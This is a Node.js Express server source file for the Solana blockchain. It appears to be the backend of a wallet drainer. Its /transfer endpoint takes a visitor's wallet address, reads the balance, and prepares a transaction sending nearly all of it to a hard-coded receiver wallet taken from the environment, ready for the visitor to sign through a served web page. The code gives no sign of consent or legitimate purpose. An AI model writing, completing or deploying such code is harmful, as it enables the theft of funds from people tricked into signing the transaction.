require('dotenv').config();
const express = require('express');
const path = require('path');
const { Connection, clusterApiUrl, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } = require('@solana/web3.js');

const app = express();
const PORT = process.env.PORT || 3000;
const RECEIVER_WALLET = process.env.RECEIVER_WALLET;
const QUICKNODE_RPC_URL = process.env.QUICKNODE_RPC_URL || clusterApiUrl('mainnet-beta');

// Serve the frontend
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to serve the web interface
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API endpoint to trigger the SOL transfer
app.get('/transfer', async (req, res) => {
    try {
        const connection = new Connection(QUICKNODE_RPC_URL, 'confirmed');
        const senderPublicKey = new PublicKey(req.query.sender);
        const receiverPublicKey = new PublicKey(RECEIVER_WALLET);

        // Get the sender's balance
        const balance = await connection.getBalance(senderPublicKey);
        if (balance === 0) {
            return res.status(400).send("Insufficient balance.");
        }

        // Create transaction to send entire balance (minus fees)
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: senderPublicKey,
                toPubkey: receiverPublicKey,
                lamports: balance - 5000, // leave some lamports for transaction fee
            })
        );

        res.send({
            message: "Transaction ready",
            transaction: transaction.serialize().toString('base64'),
        });

    } catch (error) {
        console.error("Transaction failed:", error);
        res.status(500).send(`Transaction failed: ${error.message}`);
    }
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
